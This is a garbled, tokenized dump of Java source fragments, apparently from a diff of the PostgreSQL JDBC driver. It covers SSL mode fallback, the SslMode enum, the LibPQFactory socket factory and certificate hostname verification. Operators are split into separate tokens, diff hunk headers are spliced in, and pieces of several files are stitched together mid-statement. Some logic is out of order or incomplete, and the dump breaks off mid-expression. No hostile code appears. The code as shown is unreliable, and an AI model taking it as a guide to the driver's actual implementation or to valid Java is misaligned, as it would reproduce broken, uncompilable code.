"Can", "'", "t", "use", "multi", "-", "catch", "in", "Java", "6", ":", "(", "}", "if", "(", "ex", "!", "=", "null", ")", "{", "log", "(", "Level", ".", "FINE", ",", "\"", "sslMode", "=", "=", "PREFER", ",", "however", "non", "-", "SSL", "connection", "failed", "as", "well", "\"", ",", "ex", ")", ";", "/", "/", "non", "-", "SSL", "failed", "as", "well", ",", "so", "re", "-", "throw", "original", "exception", "/", "/#", "if", "mvn", ".", "project", ".", "property", ".", "postgresql", ".", "jdbc", ".", "spec", ">", "=", "\"", "JDBC4", ".", "1", "\"", "/", "/", "Add", "non", "-", "SSL", "exception", "as", "suppressed", "e", ".", "addSuppressed", "(", "ex", ")", ";", "/", "/#", "endif", "throw", "e", ";", "}", "}", "else", "if", "(", "sslMode", "=", "=", "SslMode", ".", "ALLOW", "&", "&", "PSQLState", ".", "INVALID_AUTHORIZATION_SPECIFICATION", ".", "getState", "(", ").", "equals", "(", "e", ".", "getSQLState", "(", "))", ")", "{", "/", "/", "Try", "using", "SSL", "Throwable", "ex", "=", "null", ";", "try", "{", "newStream", "=", "tryConnect", "(", "user", ",", "database", ",", "info", ",", "socketFactory", ",", "hostSpec", ",", "SslMode", ".", "REQUIRE", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Upgraded", "to", "encrypted", "connection", "for", "host", "{", "0", "}", "\",", "hostSpec", ")", ";", "}", "catch", "(", "SQLException", "ee", ")", "{", "ex", "=", "ee", ";", "}", "catch", "(", "IOException", "ee", ")", "{", "ex", "=", "ee", ";", "/", "/", "Can", "'", "t", "use", "multi", "-", "catch", "in", "Java", "6", ":", "(", "}", "if", "(", "ex", "!", "=", "null", ")", "{", "log", "(", "Level", ".", "FINE", ",", "\"", "sslMode", "=", "=", "ALLOW", ",", "however", "SSL", "connection", "failed", "as", "well", "\"", ",", "ex", ")", ";", "/", "/", "non", "-", "SSL", "failed", "as", "well", ",", "so", "re", "-", "throw", "original", "exception", "/", "/#", "if", "mvn", ".", "project", ".", "property", ".", "postgresql", ".", "jdbc", ".", "spec", ">", "=", "\"", "JDBC4", ".", "1", "\"", "/", "/", "Add", "SSL", "exception", "as", "suppressed", "e", ".", "addSuppressed", "(", "ex", ")", ";", "/", "/#", "endif", "throw", "e", ";", "}", "throw", "e", ";", "log", "(", "Level", ".", "FINE", ",", "\"", "ConnectException", "occurred", "while", "connecting", "to", "{", "0", "}", "\",", "cex", ",", "hostSpec", ")", ";", "log", "(", "Level", ".", "FINE", ",", "\"", "IOException", "occurred", "while", "connecting", "to", "{", "0", "}", "\",", "ioe", ",", "hostSpec", ")", ";", "log", "(", "Level", ".", "FINE", ",", "\"", "SQLException", "occurred", "while", "connecting", "to", "{", "0", "}", "\",", "se", ",", "hostSpec", ")", ";", "private", "PGStream", "enableSSL", "(", "PGStream", "pgStream", ",", "SslMode", "sslMode", ",", "Properties", "info", ",", "int", "connectTimeout", ")", "throws", "IOException", ",", "PSQLException", "{", "if", "(", "sslMode", "=", "=", "SslMode", ".", "DISABLE", ")", "{", "return", "pgStream", ";", "}", "if", "(", "sslMode", "=", "=", "SslMode", ".", "ALLOW", ")", "{", "/", "/", "Allow", "=", "=>", "start", "with", "plaintext", ",", "use", "encryption", "if", "required", "by", "server", "return", "pgStream", ";", "}", "if", "(", "sslMode", ".", "requireEncryption", "(", "))", "{", "if", "(", "sslMode", ".", "requireEncryption", "(", "))", "{", "/", "/", "This", "works", "as", "follows", ":", "/", "/", "1", ".", "When", "tests", "is", "run", "from", "IDE", ",", "it", "is", "assumed", "SCRAM", "library", "is", "on", "the", "classpath", "/", "/", "2", ".", "In", "regular", "build", "for", "Java", "<", "8", "this", "`", "if", "`", "is", "deactivated", "and", "the", "code", "always", "throws", "if", "(", "false", ")", "{", "/", "/#", "else", "/", "/#", "endif", "/", "/#", "if", "mvn", ".", "project", ".", "property", ".", "postgresql", ".", "jdbc", ".", "spec", ">", "=", "\"", "JDBC4", ".", "2", "\"", "/", "/#", "endif", "while", "(", "timeoutMillis", ">", "=", "0", "|", "|", "pgStream", ".", "hasMessagePending", "(", "))", "{", "/", "*", "*", "Copyright", "(", "c", ")", "2018", ",", "PostgreSQL", "Global", "Development", "Group", "*", "See", "the", "LICENSE", "file", "in", "the", "project", "root", "for", "more", "information", ".", "*", "/", "package", "org", ".", "postgresql", ".", "jdbc", ";", "import", "org", ".", "postgresql", ".", "PGProperty", ";", "import", "org", ".", "postgresql", ".", "util", ".", "GT", ";", "import", "org", ".", "postgresql", ".", "util", ".", "PSQLException", ";", "import", "org", ".", "postgresql", ".", "util", ".", "PSQLState", ";", "import", "java", ".", "util", ".", "Properties", ";", "public", "enum", "SslMode", "{", "/", "**", "*", "Do", "not", "use", "encrypted", "connections", ".", "*", "/", "DISABLE", "(", "\"", "disable", "\"", "),", "/", "**", "*", "Start", "with", "non", "-", "encrypted", "connection", ",", "then", "try", "encrypted", "one", ".", "*", "/", "ALLOW", "(", "\"", "allow", "\"", "),", "/", "**", "*", "Start", "with", "encrypted", "connection", ",", "fallback", "to", "non", "-", "encrypted", "(", "default", ")", ".", "*", "/", "PREFER", "(", "\"", "prefer", "\"", "),", "/", "**", "*", "Ensure", "connection", "is", "encrypted", ".", "*", "/", "REQUIRE", "(", "\"", "require", "\"", "),", "/", "**", "*", "Ensure", "connection", "is", "encrypted", ",", "and", "client", "trusts", "server", "certificate", ".", "*", "/", "VERIFY_CA", "(", "\"", "verify", "-", "ca", "\"", "),", "/", "**", "*", "Ensure", "connection", "is", "encrypted", ",", "client", "trusts", "server", "certificate", ",", "and", "server", "hostname", "matches", "*", "the", "one", "listed", "in", "the", "server", "certificate", ".", "*", "/", "VERIFY_FULL", "(", "\"", "verify", "-", "full", "\"", "),", ";", "public", "static", "final", "SslMode", "[", "]", "VALUES", "=", "values", "(", ");", "public", "final", "String", "value", ";", "SslMode", "(", "String", "value", ")", "{", "this", ".", "value", "=", "value", ";", "}", "public", "boolean", "requireEncryption", "(", ")", "{", "return", "this", ".", "compareTo", "(", "REQUIRE", ")", ">", "=", "0", ";", "}", "public", "boolean", "verifyCertificate", "(", ")", "{", "return", "this", "=", "=", "VERIFY_CA", "|", "|", "this", "=", "=", "VERIFY_FULL", ";", "}", "public", "boolean", "verifyPeerName", "(", ")", "{", "return", "this", "=", "=", "VERIFY_FULL", ";", "}", "public", "static", "SslMode", "of", "(", "Properties", "info", ")", "throws", "PSQLException", "{", "String", "sslmode", "=", "PGProperty", ".", "SSL_MODE", ".", "get", "(", "info", ")", ";", "/", "/", "If", "sslmode", "is", "not", "set", ",", "fallback", "to", "ssl", "parameter", "if", "(", "sslmode", "=", "=", "null", ")", "{", "if", "(", "PGProperty", ".", "SSL", ".", "getBoolean", "(", "info", ")", "|", "|", "\"", "\".", "equals", "(", "PGProperty", ".", "SSL", ".", "get", "(", "info", ")", "))", "{", "return", "VERIFY_FULL", ";", "}", "return", "PREFER", ";", "}", "for", "(", "SslMode", "sslMode", ":", "VALUES", ")", "{", "if", "(", "sslMode", ".", "value", ".", "equalsIgnoreCase", "(", "sslmode", ")", ")", "{", "return", "sslMode", ";", "}", "}", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Invalid", "sslmode", "value", ":", "{", "0", "}", "\",", "sslmode", ")", ",", "PSQLState", ".", "CONNECTION_UNABLE_TO_CONNECT", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "20", "@", "@", "/", "*", "*", "Copyright", "(", "c", ")", "2017", ",", "PostgreSQL", "Global", "Development", "Group", "*", "See", "the", "LICENSE", "file", "in", "the", "project", "root", "for", "more", "information", ".", "*", "/", "package", "org", ".", "postgresql", ".", "ssl", ";", "import", "java", ".", "util", ".", "Properties", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLSocketFactory", ";", "/", "**", "*", "Socket", "factory", "that", "uses", "Java", "'", "s", "default", "truststore", "to", "validate", "server", "certificate", ".", "*", "Note", ":", "it", "always", "validates", "server", "certificate", ",", "so", "it", "might", "result", "to", "downgrade", "to", "non", "-", "encrypted", "*", "connection", "when", "default", "truststore", "lacks", "certificates", "to", "validate", "server", ".", "*", "/", "public", "class", "DefaultJavaSSLFactory", "extends", "WrappedFactory", "{", "public", "DefaultJavaSSLFactory", "(", "Properties", "info", ")", "{", "_factory", "=", "(", "SSLSocketFactory", ")", "SSLSocketFactory", ".", "getDefault", "(", ");", "}", "}", "@", "@", "-", "3", ",", "7", "+", "3", ",", "7", "@", "@", "package", "org", ".", "postgresql", ".", "ssl", ";", "pwdcb", ".", "clearPassword", "(", ");", "/", "*", "*", "Copyright", "(", "c", ")", "2004", ",", "PostgreSQL", "Global", "Development", "Group", "*", "See", "the", "LICENSE", "file", "in", "the", "project", "root", "for", "more", "information", ".", "*", "/", "package", "org", ".", "postgresql", ".", "ssl", ";", "import", "org", ".", "postgresql", ".", "PGProperty", ";", "import", "org", ".", "postgresql", ".", "jdbc", ".", "SslMode", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "NonValidatingFactory", ".", "NonValidatingTM", ";", "import", "org", ".", "postgresql", ".", "util", ".", "GT", ";", "import", "org", ".", "postgresql", ".", "util", ".", "ObjectFactory", ";", "import", "org", ".", "postgresql", ".", "util", ".", "PSQLException", ";", "import", "org", ".", "postgresql", ".", "util", ".", "PSQLState", ";", "import", "java", ".", "io", ".", "Console", ";", "import", "java", ".", "io", ".", "FileInputStream", ";", "import", "java", ".", "io", ".", "FileNotFoundException", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "security", ".", "GeneralSecurityException", ";", "import", "java", ".", "security", ".", "KeyManagementException", ";", "import", "java", ".", "security", ".", "KeyStore", ";", "import", "java", ".", "security", ".", "KeyStoreException", ";", "import", "java", ".", "security", ".", "NoSuchAlgorithmException", ";", "import", "java", ".", "security", ".", "cert", ".", "Certificate", ";", "import", "java", ".", "security", ".", "cert", ".", "CertificateFactory", ";", "import", "java", ".", "util", ".", "Properties", ";", "import", "javax", ".", "net", ".", "ssl", ".", "KeyManager", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLContext", ";", "import", "javax", ".", "net", ".", "ssl", ".", "TrustManager", ";", "import", "javax", ".", "net", ".", "ssl", ".", "TrustManagerFactory", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "Callback", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "CallbackHandler", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "PasswordCallback", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "UnsupportedCallbackException", ";", "/", "**", "*", "Provide", "an", "SSLSocketFactory", "that", "is", "compatible", "with", "the", "libpq", "behaviour", ".", "*", "/", "public", "class", "LibPQFactory", "extends", "WrappedFactory", "{", "LazyKeyManager", "km", ";", "/", "**", "*", "@", "param", "info", "the", "connection", "parameters", "The", "following", "parameters", "are", "used", ":", "*", "sslmode", ",", "sslcert", ",", "sslkey", ",", "sslrootcert", ",", "sslhostnameverifier", ",", "sslpasswordcallback", ",", "sslpassword", "*", "@", "throws", "PSQLException", "if", "security", "error", "appears", "when", "initializing", "factory", "*", "/", "public", "LibPQFactory", "(", "Properties", "info", ")", "throws", "PSQLException", "{", "try", "{", "SSLContext", "ctx", "=", "SSLContext", ".", "getInstance", "(", "\"", "TLS", "\"", ");", "/", "/", "or", "\"", "SSL", "\"", "?", "/", "/", "Determining", "the", "default", "file", "location", "String", "pathsep", "=", "System", ".", "getProperty", "(", "\"", "file", ".", "separator", "\"", ");", "String", "defaultdir", ";", "boolean", "defaultfile", "=", "false", ";", "if", "(", "System", ".", "getProperty", "(", "\"", "os", ".", "name", "\"", ").", "toLowerCase", "(", ").", "contains", "(", "\"", "windows", "\"", "))", "{", "/", "/", "It", "is", "Windows", "defaultdir", "=", "System", ".", "getenv", "(", "\"", "APPDATA", "\"", ")", "+", "pathsep", "+", "\"", "postgresql", "\"", "+", "pathsep", ";", "}", "else", "{", "defaultdir", "=", "System", ".", "getProperty", "(", "\"", "user", ".", "home", "\"", ")", "+", "pathsep", "+", "\"", ".", "postgresql", "\"", "+", "pathsep", ";", "}", "/", "/", "Load", "the", "client", "'", "s", "certificate", "and", "key", "String", "sslcertfile", "=", "PGProperty", ".", "SSL_CERT", ".", "get", "(", "info", ")", ";", "if", "(", "sslcertfile", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "default", "defaultfile", "=", "true", ";", "sslcertfile", "=", "defaultdir", "+", "\"", "postgresql", ".", "crt", "\"", ";", "}", "String", "sslkeyfile", "=", "PGProperty", ".", "SSL_KEY", ".", "get", "(", "info", ")", ";", "if", "(", "sslkeyfile", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "default", "defaultfile", "=", "true", ";", "sslkeyfile", "=", "defaultdir", "+", "\"", "postgresql", ".", "pk8", "\"", ";", "}", "/", "/", "Determine", "the", "callback", "handler", "CallbackHandler", "cbh", ";", "String", "sslpasswordcallback", "=", "PGProperty", ".", "SSL_PASSWORD_CALLBACK", ".", "get", "(", "info", ")", ";", "if", "(", "sslpasswordcallback", "!", "=", "null", ")", "{", "try", "{", "cbh", "=", "(", "CallbackHandler", ")", "ObjectFactory", ".", "instantiate", "(", "sslpasswordcallback", ",", "info", ",", "false", ",", "null", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "password", "callback", "class", "provided", "{", "0", "}", "could", "not", "be", "instantiated", ".", "\",", "sslpasswordcallback", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "e", ")", ";", "}", "}", "else", "{", "cbh", "=", "new", "ConsoleCallbackHandler", "(", "PGProperty", ".", "SSL_PASSWORD", ".", "get", "(", "info", ")", ");", "}", "/", "/", "If", "the", "properties", "are", "empty", ",", "give", "null", "to", "prevent", "client", "key", "selection", "km", "=", "new", "LazyKeyManager", "(", "(\"", "\".", "equals", "(", "sslcertfile", ")", "?", "null", ":", "sslcertfile", ")", ",", "(", "\"\"", ".", "equals", "(", "sslkeyfile", ")", "?", "null", ":", "sslkeyfile", ")", ",", "cbh", ",", "defaultfile", ")", ";", "TrustManager", "[", "]", "tm", ";", "SslMode", "sslMode", "=", "SslMode", ".", "of", "(", "info", ")", ";", "if", "(", "!", "sslMode", ".", "verifyCertificate", "(", "))", "{", "/", "/", "server", "validation", "is", "not", "required", "tm", "=", "new", "TrustManager", "[", "]{", "new", "NonValidatingTM", "(", ")}", ";", "}", "else", "{", "/", "/", "Load", "the", "server", "certificate", "TrustManagerFactory", "tmf", "=", "TrustManagerFactory", ".", "getInstance", "(", "\"", "PKIX", "\"", ");", "KeyStore", "ks", ";", "try", "{", "ks", "=", "KeyStore", ".", "getInstance", "(", "\"", "jks", "\"", ");", "}", "catch", "(", "KeyStoreException", "e", ")", "{", "/", "/", "this", "should", "never", "happen", "throw", "new", "NoSuchAlgorithmException", "(", "\"", "jks", "KeyStore", "not", "available", "\"", ");", "}", "String", "sslrootcertfile", "=", "PGProperty", ".", "SSL_ROOT_CERT", ".", "get", "(", "info", ")", ";", "if", "(", "sslrootcertfile", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "default", "sslrootcertfile", "=", "defaultdir", "+", "\"", "root", ".", "crt", "\"", ";", "}", "FileInputStream", "fis", ";", "try", "{", "fis", "=", "new", "FileInputStream", "(", "sslrootcertfile", ")", ";", "/", "/", "NOSONAR", "}", "catch", "(", "FileNotFoundException", "ex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "open", "SSL", "root", "certificate", "file", "{", "0", "}", ".\"", ",", "sslrootcertfile", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ex", ")", ";", "}", "try", "{", "CertificateFactory", "cf", "=", "CertificateFactory", ".", "getInstance", "(", "\"", "X", ".", "509", "\"", ");", "/", "/", "Certificate", "[", "]", "certs", "=", "cf", ".", "generateCertificates", "(", "fis", ")", ".", "toArray", "(", "new", "Certificate", "[", "]{", "})", ";", "/", "/", "Does", "/", "/", "not", "work", "in", "java", "1", ".", "4", "Object", "[", "]", "certs", "=", "cf", ".", "generateCertificates", "(", "fis", ")", ".", "toArray", "(", "new", "Certificate", "[", "]{", "})", ";", "ks", ".", "load", "(", "null", ",", "null", ")", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "certs", ".", "length", ";", "i", "+", "+)", "{", "ks", ".", "setCertificateEntry", "(", "\"", "cert", "\"", "+", "i", ",", "(", "Certificate", ")", "certs", "[", "i", "]", ");", "}", "tmf", ".", "init", "(", "ks", ")", ";", "}", "catch", "(", "IOException", "ioex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "read", "SSL", "root", "certificate", "file", "{", "0", "}", ".\"", ",", "sslrootcertfile", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ioex", ")", ";", "}", "catch", "(", "GeneralSecurityException", "gsex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Loading", "the", "SSL", "root", "certificate", "{", "0", "}", "into", "a", "TrustManager", "failed", ".", "\",", "sslrootcertfile", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "gsex", ")", ";", "}", "finally", "{", "try", "{", "fis", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "/", "*", "ignore", "*", "/", "}", "}", "tm", "=", "tmf", ".", "getTrustManagers", "(", ");", "}", "/", "/", "finally", "we", "can", "initialize", "the", "context", "try", "{", "ctx", ".", "init", "(", "new", "KeyManager", "[", "]{", "km", "}", ",", "tm", ",", "null", ")", ";", "}", "catch", "(", "KeyManagementException", "ex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "initialize", "SSL", "context", ".", "\")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ex", ")", ";", "}", "_factory", "=", "ctx", ".", "getSocketFactory", "(", ");", "}", "catch", "(", "NoSuchAlgorithmException", "ex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "find", "a", "java", "cryptographic", "algorithm", ":", "{", "0", "}", ".\"", ",", "ex", ".", "getMessage", "(", "))", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ex", ")", ";", "}", "}", "/", "**", "*", "Propagates", "any", "exception", "from", "{", "@", "link", "LazyKeyManager", "}", ".", "*", "*", "@", "throws", "PSQLException", "if", "there", "is", "an", "exception", "to", "propagate", "*", "/", "public", "void", "throwKeyManagerException", "(", ")", "throws", "PSQLException", "{", "if", "(", "km", "!", "=", "null", ")", "{", "km", ".", "throwKeyManagerException", "(", ");", "}", "}", "/", "**", "*", "A", "CallbackHandler", "that", "reads", "the", "password", "from", "the", "console", "or", "returns", "the", "password", "given", "to", "its", "*", "constructor", ".", "*", "/", "static", "class", "ConsoleCallbackHandler", "implements", "CallbackHandler", "{", "private", "char", "[", "]", "password", "=", "null", ";", "ConsoleCallbackHandler", "(", "String", "password", ")", "{", "if", "(", "password", "!", "=", "null", ")", "{", "this", ".", "password", "=", "password", ".", "toCharArray", "(", ");", "}", "}", "/", "**", "*", "Handles", "the", "callbacks", ".", "*", "*", "@", "param", "callbacks", "The", "callbacks", "to", "handle", "*", "@", "throws", "UnsupportedCallbackException", "If", "the", "console", "is", "not", "available", "or", "other", "than", "*", "PasswordCallback", "is", "supplied", "*", "/", "@", "Override", "public", "void", "handle", "(", "Callback", "[", "]", "callbacks", ")", "throws", "IOException", ",", "UnsupportedCallbackException", "{", "Console", "cons", "=", "System", ".", "console", "(", ");", "if", "(", "cons", "=", "=", "null", "&", "&", "password", "=", "=", "null", ")", "{", "throw", "new", "UnsupportedCallbackException", "(", "callbacks", "[", "0", "]", ",", "\"", "Console", "is", "not", "available", "\"", ");", "}", "for", "(", "Callback", "callback", ":", "callbacks", ")", "{", "if", "(", "!(", "callback", "instanceof", "PasswordCallback", ")", ")", "{", "throw", "new", "UnsupportedCallbackException", "(", "callback", ")", ";", "}", "PasswordCallback", "pwdCallback", "=", "(", "PasswordCallback", ")", "callback", ";", "if", "(", "password", "!", "=", "null", ")", "{", "pwdCallback", ".", "setPassword", "(", "password", ")", ";", "continue", ";", "}", "/", "/", "It", "is", "used", "instead", "of", "cons", ".", "readPassword", "(", "prompt", ")", ",", "because", "the", "prompt", "may", "contain", "'", "%'", "/", "/", "characters", "pwdCallback", ".", "setPassword", "(", "cons", ".", "readPassword", "(", "\"%", "s", "\"", ",", "pwdCallback", ".", "getPrompt", "(", "))", ");", "}", "}", "}", "}", "@", "@", "-", "7", ",", "7", "+", "7", ",", "8", "@", "@", "import", "org", ".", "postgresql", ".", "core", ".", "SocketFactoryFactory", ";", "import", "org", ".", "postgresql", ".", "jdbc", ".", "SslMode", ";", "SSLSocketFactory", "factory", "=", "SocketFactoryFactory", ".", "getSslSocketFactory", "(", "info", ")", ";", "newConnection", ".", "setUseClientMode", "(", "true", ")", ";", "if", "(", "factory", "instanceof", "LibPQFactory", ")", "{", "/", "/", "throw", "any", "KeyManager", "exception", "(", "(", "LibPQFactory", ")", "factory", ")", ".", "throwKeyManagerException", "(", ");", "}", "SslMode", "sslMode", "=", "SslMode", ".", "of", "(", "info", ")", ";", "if", "(", "sslMode", ".", "verifyPeerName", "(", "))", "{", "verifyPeerName", "(", "stream", ",", "info", ",", "newConnection", ")", ";", "}", "stream", ".", "changeSocket", "(", "newConnection", ")", ";", "}", "private", "static", "void", "verifyPeerName", "(", "PGStream", "stream", ",", "Properties", "info", ",", "SSLSocket", "newConnection", ")", "throws", "PSQLException", "{", "HostnameVerifier", "hvn", ";", "if", "(", "sslhostnameverifier", "=", "=", "null", ")", "{", "hvn", "=", "PGjdbcHostnameVerifier", ".", "INSTANCE", ";", "sslhostnameverifier", "=", "\"", "PgjdbcHostnameVerifier", "\"", ";", "}", "else", "{", "}", "if", "(", "hvn", ".", "verify", "(", "stream", ".", "getHostSpec", "(", ").", "getHost", "(", "),", "newConnection", ".", "getSession", "(", "))", ")", "{", "return", ";", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "hostname", "{", "0", "}", "could", "not", "be", "verified", "by", "hostnameverifier", "{", "1", "}", ".\"", ",", "stream", ".", "getHostSpec", "(", ").", "getHost", "(", "),", "sslhostnameverifier", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ")", ";", "/", "*", "*", "Copyright", "(", "c", ")", "2018", ",", "PostgreSQL", "Global", "Development", "Group", "*", "See", "the", "LICENSE", "file", "in", "the", "project", "root", "for", "more", "information", ".", "*", "/", "package", "org", ".", "postgresql", ".", "ssl", ";", "import", "org", ".", "postgresql", ".", "util", ".", "GT", ";", "import", "java", ".", "net", ".", "IDN", ";", "import", "java", ".", "security", ".", "cert", ".", "CertificateParsingException", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Comparator", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "logging", ".", "Level", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "javax", ".", "naming", ".", "InvalidNameException", ";", "import", "javax", ".", "naming", ".", "ldap", ".", "LdapName", ";", "import", "javax", ".", "naming", ".", "ldap", ".", "Rdn", ";", "import", "javax", ".", "net", ".", "ssl", ".", "HostnameVerifier", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLPeerUnverifiedException", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLSession", ";", "import", "javax", ".", "security", ".", "auth", ".", "x500", ".", "X500Principal", ";", "public", "class", "PGjdbcHostnameVerifier", "implements", "HostnameVerifier", "{", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "PGjdbcHostnameVerifier", ".", "class", ".", "getName", "(", "))", ";", "public", "static", "final", "PGjdbcHostnameVerifier", "INSTANCE", "=", "new", "PGjdbcHostnameVerifier", "(", ");", "private", "static", "final", "int", "TYPE_DNS_NAME", "=", "2", ";", "private", "static", "final", "int", "TYPE_IP_ADDRESS", "=", "7", ";", "public", "static", "Comparator", "<", "String", ">", "HOSTNAME_PATTERN_COMPARATOR", "=", "new", "Comparator", "<", "String", ">", "()", "{", "private", "int", "countChars", "(", "String", "value", ",", "char", "ch", ")", "{", "int", "count", "=", "0", ";", "int", "pos", "=", "-", "1", ";", "while", "(", "true", ")", "{", "pos", "=", "value", ".", "indexOf", "(", "ch", ",", "pos", "+", "1", ")", ";", "if", "(", "pos", "=", "=", "-", "1", ")", "{", "break", ";", "}", "count", "+", "+;", "}", "return", "count", ";", "}", "@", "Override", "public", "int", "compare", "(", "String", "o1", ",", "String", "o2", ")", "{", "/", "/", "The", "more", "the", "dots", "the", "better", ":", "a", ".", "b", ".", "c", ".", "postgresql", ".", "org", "is", "more", "specific", "than", "postgresql", ".", "org", "int", "d1", "=", "countChars", "(", "o1", ",", "'", ".'", ");", "int", "d2", "=", "countChars", "(", "o2", ",", "'", ".'", ");", "if", "(", "d1", "!", "=", "d2", ")", "{", "return", "d1", ">", "d2", "?", "1", ":", "-", "1", ";", "}", "/", "/", "The", "less", "the", "stars", "the", "better", ":", "postgresql", ".", "org", "is", "more", "specific", "than", "*", ".*", ".", "postgresql", ".", "org", "int", "s1", "=", "countChars", "(", "o1", ",", "'", "*'", ");", "int", "s2", "=", "countChars", "(", "o2", ",", "'", "*'", ");", "if", "(", "s1", "!", "=", "s2", ")", "{", "return", "s1", "<", "s2", "?", "1", ":", "-", "1", ";", "}", "/", "/", "The", "longer", "the", "better", ":", "postgresql", ".", "org", "is", "more", "specific", "than", "sql", ".", "org", "int", "l1", "=", "o1", ".", "length", "(", ");", "int", "l2", "=", "o2", ".", "length", "(", ");", "if", "(", "l1", "!", "=", "l2", ")", "{", "return", "l1", ">", "l2", "?", "1", ":", "-", "1", ";", "}", "return", "0", ";", "}", "}", ";", "@", "Override", "public", "boolean", "verify", "(", "String", "hostname", ",", "SSLSession", "session", ")", "{", "X509Certificate", "[", "]", "peerCerts", ";", "try", "{", "peerCerts", "=", "(", "X509Certificate", "[", "])", "session", ".", "getPeerCertificates", "(", ");", "}", "catch", "(", "SSLPeerUnverifiedException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Unable", "to", "parse", "X509Certificate", "for", "hostname", "{", "0", "}", "\",", "hostname", ")", ",", "e", ")", ";", "return", "false", ";", "}", "if", "(", "peerCerts", "=", "=", "null", "|", "|", "peerCerts", ".", "length", "=", "=", "0", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "No", "certificates", "found", "for", "hostname", "{", "0", "}", "\",", "hostname", ")", ");", "return", "false", ";", "}", "String", "canonicalHostname", ";", "if", "(", "hostname", ".", "startsWith", "(", "\"[", "\")", "&", "&", "hostname", ".", "endsWith", "(", "\"]", "\")", ")", "{", "/", "/", "IPv6", "address", "like", "[", "2001", ":", "db8", ":", "0", ":", "1", ":", "1", ":", "1", ":", "1", ":", "1", "]", "canonicalHostname", "=", "hostname", ".", "substring", "(", "1", ",", "hostname", ".", "length", "(", ")", "-", "1", ")", ";", "}", "else", "{", "/", "/", "This", "converts", "unicode", "domain", "name", "to", "ASCII", "try", "{", "canonicalHostname", "=", "IDN", ".", "toASCII", "(", "hostname", ")", ";", "if", "(", "LOGGER", ".", "isLoggable", "(", "Level", ".", "FINEST", ")", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINEST", ",", "\"", "Canonical", "host", "name", "for", "{", "0", "}", "is", "{", "1", "}", "\",", "new", "Object", "[", "]{", "hostname", ",", "canonicalHostname", "}", ");", "}", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "/", "/", "e", ".", "g", ".", "hostname", "is", "invalid", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Hostname", "{", "0", "}", "is", "invalid", "\"", ",", "hostname", ")", ",", "e", ")", ";", "return", "false", ";", "}", "}", "X509Certificate", "serverCert", "=", "peerCerts", "[", "0", "]", ";", "/", "/", "Check", "for", "Subject", "Alternative", "Names", "(", "see", "RFC", "6125", ")", "Collection", "<", "List", "<", "?>", ">", "subjectAltNames", ";", "try", "{", "subjectAltNames", "=", "serverCert", ".", "getSubjectAlternativeNames", "(", ");", "if", "(", "subjectAltNames", "=", "=", "null", ")", "{", "subjectAltNames", "=", "Collections", ".", "emptyList", "(", ");", "}", "}", "catch", "(", "CertificateParsingException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Unable", "to", "parse", "certificates", "for", "hostname", "{", "0", "}", "\",", "hostname", ")", ",", "e", ")", ";", "return", "false", ";", "}", "boolean", "anyDnsSan", "=", "false", ";", "/", "*", "*", "Each", "item", "in", "the", "SAN", "collection", "is", "a", "2", "-", "element", "list", ".", "*", "See", "{", "@", "link", "X509Certificate", "#", "getSubjectAlternativeNames", "}", "*", "The", "first", "element", "in", "each", "list", "is", "a", "number", "indicating", "the", "type", "of", "entry", ".", "*", "/", "for", "(", "List", "<", "?>", "sanItem", ":", "subjectAltNames", ")", "{", "if", "(", "sanItem", ".", "size", "(", ")", "!", "=", "2", ")", "{", "continue", ";", "}", "Integer", "sanType", "=", "(", "Integer", ")", "sanItem", ".", "get", "(", "0", ")", ";", "if", "(", "sanType", "=", "=", "null", 